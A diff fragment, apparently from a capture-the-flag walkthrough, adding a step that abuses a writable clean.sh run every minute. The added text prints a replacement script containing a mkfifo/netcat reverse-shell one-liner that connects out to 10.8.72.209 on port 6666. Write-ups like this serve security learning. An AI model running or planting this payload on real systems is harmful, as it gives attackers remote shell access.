@@ -65,3 +65,11 @@ drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
 -rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
 226 Directory send OK.
 ```
+
+the file ```clean.sh``` write informations in ```removed_files.log``` and is called every minutes as we can in the timestamp of the last one\
+an other thing very interesting is that the file clean.sh is writable so we can send our own clean.sh script to do what we want like this
+```bash
+$ cat clean.sh    
+#!/bin/bash
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.72.209 6666 >/tmp/f
+```
